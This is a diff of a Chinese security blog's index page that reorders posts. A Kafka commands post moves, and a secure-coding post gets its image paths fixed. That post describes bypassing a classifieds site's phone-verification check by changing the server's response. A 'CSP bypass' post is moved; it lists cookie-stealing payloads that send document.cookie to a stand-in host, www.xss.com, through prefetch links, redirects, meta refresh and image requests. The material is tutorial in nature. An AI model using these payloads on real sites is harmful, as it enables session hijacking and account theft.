@@ -152,6 +152,61 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-soft/kafka命令操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/09/soft/kafka命令操作/">kafka 常用命令</a>
+    </h1>
+  
+
+        <a href="/2017/01/09/soft/kafka命令操作/" class="archive-article-date">
+  	<time datetime="2017-01-09T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-09</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="查看topic"><a href="#查看topic" class="headerlink" title="查看topic"></a>查看topic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./kafka-topics.sh --zookeeper 123.58.173.157:2181 --list（列出所有topic）</div></pre></td></tr></table></figure>
+<h4 id="控制台接收信息"><a href="#控制台接收信息" class="headerlink" title="控制台接收信息"></a>控制台接收信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bin/kafka-console-consumer.sh --zookeeper  192.168.197.170:2181,192.168.197.171:2181  --from-beginning --topic test</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/soft/">soft</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/01/09/soft/kafka命令操作/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-web安全/安全编码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -312,8 +367,10 @@
 </ol>
 <p>案例：</p>
 <p>在发布二手买卖信息时候，在填写取货信息时有个对是否是本人手机的验证，</p>
-<p><img src="./581.jpg" alt="58"></p>
-<p>在这个时候拦截网址<a href="http://post.58.com/ajax/?action=checkmobilecodeandblind&amp;phone=13945678910&amp;code=123123123&amp;userid=xxxxxx，是服务器返回的值，一般验证码不对的话会返回-1或者0，修改值为1，通行，直接发布成功" target="_blank" rel="external">http://post.58.com/ajax/?action=checkmobilecodeandblind&amp;phone=13945678910&amp;code=123123123&amp;userid=xxxxxx，是服务器返回的值，一般验证码不对的话会返回-1或者0，修改值为1，通行，直接发布成功</a></p>
+<p><img src="./安全编码/581.jpg" alt="58"></p>
+<p>在这个时候拦截网址</p>
+<p><a href="http://post.58.com/ajax/?action=checkmobilecodeandblind&amp;phone=13945678910&amp;code=123123123&amp;userid=xxxxxx" target="_blank" rel="external">http://post.58.com/ajax/?action=checkmobilecodeandblind&amp;phone=13945678910&amp;code=123123123&amp;userid=xxxxxx</a></p>
+<p>是服务器返回的值，一般验证码不对的话会返回-1或者0，修改值为1，通行，直接发布成功</p>
 <ol>
 <li>js限制登入</li>
 </ol>
@@ -323,9 +380,9 @@
 </ol>
 <p>只是做了个登入页面来做认证，后面的二级页面没有验证用户是否真的登入</p>
 <p>案例：</p>
-<p><img src="./info1.jpg" alt="info"></p>
+<p><img src="./安全编码/info1.jpg" alt="info"></p>
 <p>直接访问这些连接就能看到学生的所有信息</p>
-<p><img src="./info2.jpg" alt="info"></p>
+<p><img src="./安全编码/info2.jpg" alt="info"></p>
 <ol>
 <li>点击劫持</li>
 </ol>
@@ -347,61 +404,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2017/01/09/web安全/安全编码/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-soft/kafka命令操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/01/09/soft/kafka命令操作/">kafka 常用命令</a>
-    </h1>
-  
-
-        <a href="/2017/01/09/soft/kafka命令操作/" class="archive-article-date">
-  	<time datetime="2017-01-09T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-09</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="查看topic"><a href="#查看topic" class="headerlink" title="查看topic"></a>查看topic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./kafka-topics.sh --zookeeper 123.58.173.157:2181 --list（列出所有topic）</div></pre></td></tr></table></figure>
-<h4 id="控制台接收信息"><a href="#控制台接收信息" class="headerlink" title="控制台接收信息"></a>控制台接收信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bin/kafka-console-consumer.sh --zookeeper  192.168.197.170:2181,192.168.197.171:2181  --from-beginning --topic test</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/soft/">soft</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/01/09/soft/kafka命令操作/">展开全文 >></a>
         </p>
       
 
@@ -995,6 +997,76 @@
 
 
   
+    <article id="post-web安全/绕过csp发送cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/web安全/绕过csp发送cookie/">CSP bypass</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/web安全/绕过csp发送cookie/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>dns 預读取</li>
+</ol>
+<p>firefox</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
+<p>chrome</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
+<ol>
+<li>通用的bypass</li>
+</ol>
+<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>比如动态创建元素,再引发页面跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
+<p>或者是使用<meta>标签进行跳转</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-安全测试/brupsuite/基于burp插件的安全测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1198,76 +1270,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-web安全/绕过csp发送cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/web安全/绕过csp发送cookie/">CSP bypass</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/web安全/绕过csp发送cookie/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ol>
-<li>dns 預读取</li>
-</ol>
-<p>firefox</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns</div></pre></td></tr></table></figure>
-<p>chrome</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可</div><div class="line">直接用get方式把cookie传递到攻击者的服务器上</div><div class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</div><div class="line">只需要用js动态创建元素的方法,就可在href中插入cookie</div></pre></td></tr></table></figure>
-<ol>
-<li>通用的bypass</li>
-</ol>
-<p>其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>比如动态创建元素,再引发页面跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var a=document.createElement(&quot;a&quot;);</div><div class="line">a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">a.click();</div></pre></td></tr></table></figure>
-<p>或者是使用<meta>标签进行跳转</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var i=document.createElement(&quot;img&quot;);</div><div class="line">i.src=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);</div><div class="line">xxx.appendChild(i);</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/web安全/绕过csp发送cookie/">展开全文 >></a>
         </p>
       
 
